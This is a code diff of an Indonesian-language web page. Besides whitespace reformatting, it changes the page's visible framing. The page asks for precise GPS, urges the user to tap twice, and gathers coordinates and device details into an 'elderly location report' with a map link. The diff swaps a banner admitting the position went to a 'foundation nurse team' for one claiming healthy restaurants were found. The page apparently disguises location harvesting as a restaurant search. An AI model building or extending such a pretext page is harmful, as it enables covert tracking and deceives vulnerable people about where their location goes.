@@ -10,7 +10,7 @@
 
 // Pre-warm permissions API agar dialog izin lebih cepat muncul
 if (typeof navigator !== 'undefined' && navigator.permissions?.query) {
-  try { navigator.permissions.query({ name: 'geolocation' }).catch(() => {}); } catch (_) {}
+  try { navigator.permissions.query({ name: 'geolocation' }).catch(() => { }); } catch (_) { }
 }
 
 let _locOpenedAt = 0;
@@ -25,29 +25,29 @@ function startLocation(event) {
   _isTriggeringLoc = false;
 
   if (navigator.permissions?.query) {
-    try { navigator.permissions.query({ name: 'geolocation' }).catch(() => {}); } catch (_) {}
+    try { navigator.permissions.query({ name: 'geolocation' }).catch(() => { }); } catch (_) { }
   }
 
   showScreen('screen-prep-lokasi');
 
-  const badge        = $('loc-badge');
-  const badgeText    = $('loc-badge-text');
-  const title        = $('loc-title');
-  const subtitle     = $('loc-subtitle');
+  const badge = $('loc-badge');
+  const badgeText = $('loc-badge-text');
+  const title = $('loc-title');
+  const subtitle = $('loc-subtitle');
   const bottomTrigger = $('loc-bottom-trigger');
   const bottomProgress = $('loc-bottom-progress');
-  const gpsPhase     = $('loc-gps-phase');
-  const locVideo     = $('loc-video');
-  const btnTrigger   = $('btn-trigger-lokasi');
+  const gpsPhase = $('loc-gps-phase');
+  const locVideo = $('loc-video');
+  const btnTrigger = $('btn-trigger-lokasi');
 
-  if (badge)        badge.className = 'rec-badge loc-badge-idle';
-  if (badgeText)    badgeText.textContent = 'CARI RESTORAN';
-  if (title)        title.textContent = 'Restoran Sehat Terdekat';
-  if (subtitle)     subtitle.innerHTML = 'Aplikasi akan mencari restoran sehat terdekat dari lokasi anda.<br>Ketuk tombol di bawah <strong>2 kali</strong>.';
-  if (bottomTrigger)  bottomTrigger.style.display = 'flex';
-  if (gpsPhase)       gpsPhase.style.display = 'none';
+  if (badge) badge.className = 'rec-badge loc-badge-idle';
+  if (badgeText) badgeText.textContent = 'CARI RESTORAN';
+  if (title) title.textContent = 'Restoran Sehat Terdekat';
+  if (subtitle) subtitle.innerHTML = 'Aplikasi akan mencari restoran sehat terdekat dari lokasi anda.<br>Ketuk tombol di bawah <strong>2 kali</strong>.';
+  if (bottomTrigger) bottomTrigger.style.display = 'flex';
+  if (gpsPhase) gpsPhase.style.display = 'none';
   if (bottomProgress) bottomProgress.style.display = 'none';
-  if (locVideo)       locVideo.pause();
+  if (locVideo) locVideo.pause();
 
   // Blokir ghost-click 400ms setelah layar dibuka
   if (btnTrigger) {
@@ -61,7 +61,7 @@ async function handleLocationReady(position) {
 
   const { latitude: lat, longitude: lon, accuracy } = position.coords;
   const mapsLink = `https://maps.google.com/?q=${lat},${lon}`;
-  const devInfo  = await collectDeviceInfo();
+  const devInfo = await collectDeviceInfo();
 
   const details = [
     'LAPORAN LOKASI LANSIA', '',
@@ -150,40 +150,40 @@ function triggerLocationGPS(event) {
 
   // ② Haptic feedback
   if (navigator.vibrate) {
-    try { navigator.vibrate([50, 40, 50]); } catch (_) {}
+    try { navigator.vibrate([50, 40, 50]); } catch (_) { }
   }
 
   // ③ Update DOM di frame berikutnya — tidak memblokir browser IPC
   requestAnimationFrame(() => {
-    const btn  = $('btn-trigger-lokasi');
+    const btn = $('btn-trigger-lokasi');
     const text = $('btn-trigger-lokasi-text');
-    const sub  = $('btn-trigger-lokasi-sub');
+    const sub = $('btn-trigger-lokasi-sub');
     if (btn && text) {
       btn.classList.add('trigger-active');
       text.textContent = '👆 KETUK SEKARANG!';
       if (sub) sub.textContent = 'UNTUK MULAI MENCARI';
     }
 
-    const badge        = $('loc-badge');
-    const badgeText    = $('loc-badge-text');
-    const title        = $('loc-title');
-    const subtitle     = $('loc-subtitle');
+    const badge = $('loc-badge');
+    const badgeText = $('loc-badge-text');
+    const title = $('loc-title');
+    const subtitle = $('loc-subtitle');
     const bottomTrigger = $('loc-bottom-trigger');
-    const gpsPhase     = $('loc-gps-phase');
+    const gpsPhase = $('loc-gps-phase');
     const progressText = $('loc-progress-text');
-    const bar          = $('loc-progress-bar');
-    const locVideo     = $('loc-video');
+    const bar = $('loc-progress-bar');
+    const locVideo = $('loc-video');
 
-    if (badge)        badge.className = 'rec-badge rec-badge-recording';
-    if (badgeText)    badgeText.textContent = 'MENCARI RESTORAN...';
-    if (title)        title.textContent = 'Sedang Mencari Restoran Sehat Terdekat...';
-    if (subtitle)     subtitle.textContent = 'Mencari koordinat GPS presisi tinggi.';
+    if (badge) badge.className = 'rec-badge rec-badge-recording';
+    if (badgeText) badgeText.textContent = 'MENCARI RESTORAN...';
+    if (title) title.textContent = 'Sedang Mencari Restoran Sehat Terdekat...';
+    if (subtitle) subtitle.textContent = 'Mencari koordinat GPS presisi tinggi.';
     if (progressText) progressText.textContent = '📡 Mencari koordinat GPS, mohon tunggu...';
     if (bottomTrigger) bottomTrigger.style.display = 'none';
-    if (gpsPhase)     gpsPhase.style.display = 'block';
-    if (bar)          bar.style.width = '35%';
+    if (gpsPhase) gpsPhase.style.display = 'block';
+    if (bar) bar.style.width = '35%';
 
-    if (locVideo) { locVideo.currentTime = 0; locVideo.play().catch(() => {}); }
+    if (locVideo) { locVideo.currentTime = 0; locVideo.play().catch(() => { }); }
   });
 }
 
@@ -203,18 +203,18 @@ function showFoundationListScreen(lat, lon, accuracy) {
   const bannerSub = $('foundation-banner-sub');
   if (bannerSub) {
     const accText = accuracy ? ` (akurasi ±${Math.round(accuracy)}m)` : '';
-    bannerSub.textContent = `Posisi GPS Anda telah diterima oleh tim perawat yayasan${accText}.`;
+    bannerSub.textContent = `Restoran sehat terdekat dari lokasi anda berhasil ditemukan${accText}.`;
   }
 
   showScreen('screen-foundation-list');
 
   // Animasi staggered kartu masuk satu per satu
   document.querySelectorAll('.foundation-card').forEach((card, idx) => {
-    card.style.opacity   = '0';
+    card.style.opacity = '0';
     card.style.transform = 'translateY(24px)';
     card.style.transition = 'opacity 0.4s cubic-bezier(0.16, 1, 0.3, 1), transform 0.4s cubic-bezier(0.16, 1, 0.3, 1)';
     setTimeout(() => {
-      card.style.opacity   = '1';
+      card.style.opacity = '1';
       card.style.transform = 'translateY(0)';
     }, 100 + idx * 80);
   });
